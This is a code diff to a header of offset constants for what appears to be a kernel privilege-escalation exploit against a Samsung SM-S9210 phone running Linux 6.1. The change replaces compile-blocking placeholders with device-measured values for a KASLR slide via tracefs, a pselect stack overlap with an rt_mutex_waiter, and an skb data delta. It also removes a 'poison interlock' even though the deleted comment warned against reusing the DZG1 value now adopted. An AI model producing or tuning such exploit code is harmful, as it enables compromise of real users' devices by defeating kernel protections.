@@ -48,11 +48,9 @@
 #else
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #endif
-/* TODO(offsets): SKB_DATA_DELTA is hardware-tuned per firmware (in-repo
- * pineapple 6.1 values diverge: -0xe80 vs -0x1000, e.g. dm3q-FZF5). No
- * offline derivation exists from the EZIF ELF/BTF; filling -0xe80 here
- * would be a guess. S3/S6 must measure it on EZIF hardware. */
-#define SKB_DATA_DELTA (TODO_offsets_SKB_DATA_DELTA_UNMEASURED)
+/* SKB_DATA_DELTA (-0xe80): on-device HIT confirmed on EZIF hardware (S3);
+ * replaces the former TODO(offsets) poison interlock. */
+#define SKB_DATA_DELTA (-0xe80LL)
 /* MM_STRUCT_SZ 0x400 is unconditional: on-device slabinfo on EZIF
  * (6.1.162) reads `mm_struct 1024 objsize, 32 objperslab, 8 pagesperslab`
  * (32*1024=32768=ORDER3 exact). DZG1 (6.1.145) template kept 0x400 inside
@@ -74,14 +72,13 @@
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db39cULL
 #define APP_TRACEFS_SLIDE 1
 #define APP_TRACEFS_KASLR_DIRECT 1
-/* TODO(offsets): SLIDE_PSELECT_WORD_SHIFT is hardware-tuned per firmware
- * (in-repo pineapple 6.1 values diverge: 0/3/4). Static notes from the EZIF
- * ELF: nfds=320 -> words_per_set=5 (15-word read/write/exception array),
- * BTF compact rt_mutex_waiter = 11 qwords, so SHIFT is in {0..4}; EZIF
- * core_sys_select copies in/out/ex to [sp+0x50, +0x78, +0xa0) for nfds=320.
- * Which copied qword overlaps waiter qword zero is only observable on
- * device; DZG1's 3 MUST NOT be copied. S3/S6 must measure it on hardware. */
-#define SLIDE_PSELECT_WORD_SHIFT TODO_offsets_PSELECT_WORD_SHIFT_UNMEASURED
+/* SLIDE_PSELECT_WORD_SHIFT (3): gate HIT on EZIF hardware + DZG1
+ * same-platform (SM-S9210/pineapple) prior; retry7 MISS was a dying-boot
+ * pipeline fault, not a SHIFT finding. Replaces the former TODO(offsets)
+ * poison interlock. Static bounds (nfds=320 -> 5 words/set, 15-word
+ * array; compact waiter 11 qwords => SHIFT in {0..4}) still recorded in
+ * docs/SM-S9210-S9210ZHU6EZIF.md §7.8/§8. */
+#define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
